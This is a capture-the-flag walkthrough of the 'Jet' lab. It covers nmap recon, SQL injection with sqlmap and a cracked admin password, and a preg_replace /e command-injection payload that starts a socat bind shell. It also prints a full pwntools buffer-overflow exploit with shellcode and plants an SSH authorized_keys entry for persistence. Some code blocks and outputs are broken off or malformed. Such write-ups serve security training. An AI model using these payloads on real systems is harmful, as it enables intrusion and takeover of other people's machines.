# Recon

## nmap

Nmap spits out a few tcp ports.

| Port       | Service                 |
| ---        | ---                     |
| 22/tcp     | ssh                     |
| 53/tcp     | dns                     |
| 80/tcp     | nginx                   |
| 5555/tcp   | freeciv?                |
| 7777/tcp   | cbt?                    |
| 9201/tcp   | BaseHTTPServer (python) |
| 600002/tcp | unknown?                |

# Flag "Connect" 

You will find that flag by just looking at nginx default page at port 80.

`JET{s4n1ty_ch3ck}`

# Flag "Digging in..."

By using `dig` you can get the hostname associated with the given ip address:

```
--- ~ Â» dig -x 10.13.37.10 @10.13.37.10

Writing them to your hosts file you can browse to the webpage `http://www.securewebinc.jet/` where you will find the flag.

# Flag "Bypassing Authentication"

From reading the source of the webpage at `http://www.securewebinc.jet` you will find a link to a custom javascript file called `secure.js`

```
eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));
```

Decoding this file you will get

```
function getStats()
{
    $.ajax({url: "/dirb_safe_dir_rf9EmcEIx/admin/stats.php",

        success: function(result){
        $('#attacks').html(result)
    },
    error: function(result){
         console.log(result);
    }});
}
getStats();
setInterval(function(){ getStats(); }, 10000);
```

This is leaking a path as you can see.

You will get a login at `http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php`

The parameter `username` of the post login is prone to different SQL-Injection methods. Leveraging sqlmap you will be able to retrieve the following information:

```
Database: jetadmin
Table: users
[1 entry]
+----+----------+------------------------------------------------------------------+
| id | username | password                                                         |
+----+----------+------------------------------------------------------------------+
| 1  | admin    | 97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084 |
+----+----------+------------------------------------------------------------------+
```

Using crackstation on that hash will reveal it is `Hackthesystem200` in plain text. So the credentials are `admin:Hackthesystem200`.

In the Chat window you will find the flag: `JET{sQl_1nj3ct1ons_4r3_fun!}`

# Flag "Going Deeper"

Looking at the resulting login page of the previous step you will find a comment in `login.php` saying:

`<!-- JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll} -->`

# Flag "Command"

Using the applications mail function you can exploit a preg\_replace call. The mail function wants to replace bad words. So using burp and altering the request to this you can instert arbitrary system commands:

```
earwords[/fuck/e]=system("/tmp/socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane")&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad person&to=a@a.com&subject=test&message=<p>fuck<br></p>&_wysihtml5_mode=1
```

As you can see I transfered `socat` as always and issued a bind shell.

```

JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
```


# Flag "Elasticity"

You will find enumerating, that the service at port 9201 is also a webserver. By error messages using curl you will be able to find the url `http://10.13.37.10:9201/search?category=`

It expects a category. Using the word `admin` it will reveal a message.

```
[{"category": "admin", "body": "Hey Rob - just so you know, that information you wanted has been sent.", "timestamp": "2017-11-13 08:31", "subject": "Just a heads up Rob"}, {"category": "admin", "body": "Thanks dude - all done. You can delete our little secret. Kind regards, Rob", "timestamp": "2017-11-13 13:40", "subject": "Thanks Jazz"}]
```

So if you insert `admin` as unicode escaped string `\u0061\u0064\u006d\u0069\u006e` you'll get the same message.

If you insert `'` as escaped character there will be an error message.

Basic SQLi is leaking the flag. User `admin' || '1'=='1` as encoded payload and you will get:

```
[{"category": "admin", "body": "Hey Rob - just so you know, that information you wanted has been sent.", "timestamp": "2017-11-13 08:31", "subject": "Just a heads up Rob"}, {"category": "maintenance", "body": "Performance to our API has been reduced for a period of 3 hours.

# Flag "Overflown"

The file `/home/leak` is no directory, but a binary.

```
www-data@jet:/home$ file leak
leak: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e423d25f1c41c318a8f5702f93b8e3f47273256a, not stripped
```

It will serve the service at port 60002 refering to `ps`

```
www-data@jet:/home$ ps aux | grep leak
www-data  69163  0.0  0.0  11288   876 pts/4    S+   06:09   0:00 grep leak
www-data  94397  0.0  0.0  24364  2896 ?        S    Jan08   0:00 socat TCP4-LISTEN:60002,reuseaddr,fork EXEC:/home/leak
```

So let's transfer it to our host first.

It has a buffer size of 72. Is an easy 64bit executable stack Bof.

With this script using pwntools you will be able to exploit it lcoally.

```
www-data@jet:/tmp$ cat sploit_leak.py 
from pwn import *

p = process("/home/leak")
p.recvuntil("leaking! ")
addr = int(p.recvuntil("\n"),16)
p.recvuntil(">")

#shellcode = asm(shellcraft.execve("/bin/bash"))
shellcode="\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x48\x89\xe6\xb0\x3b\x0f\x05"

p.sendline(shellcode + "\x90"*(72 - len(shellcode)) + p64(addr))
p.interactive()
```

The results are as follows

```

You echo a publik gpg key to `/home/alex/.ssh/authorized_keys` and can now logon via ssh.

# Flag "Secret Message"

In Alex home folder there are a few files Copy over the `crypter.py` the `encrypted.txt` message and the `exploitme.zip`. The zip contains the membermanager which is running on another port. Will be handy to look at this binary. But first we have to find the password for the zip, as rockyou will not beat the password.
There still is the crypter.py which describes, how a `message.txt` was encrypted to `encrypted.txt` using a key and `xor`. Using `xortool` you can brute force some plain text. `securewebincrocks` is what can be read from trying to brute the encryption. So let's rewrite the script to decrypt and try using this as key.

In fact we do not need to rewrite that. Using the `encrypted.txt` as input and just xor'ing again with the same key will decrypt the message just fine.

```
Hello mate!

First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!

Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
Make sure those binaries are kept safe!

To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.

The ports are 5555 and 7777.
Have fun and keep it safe!
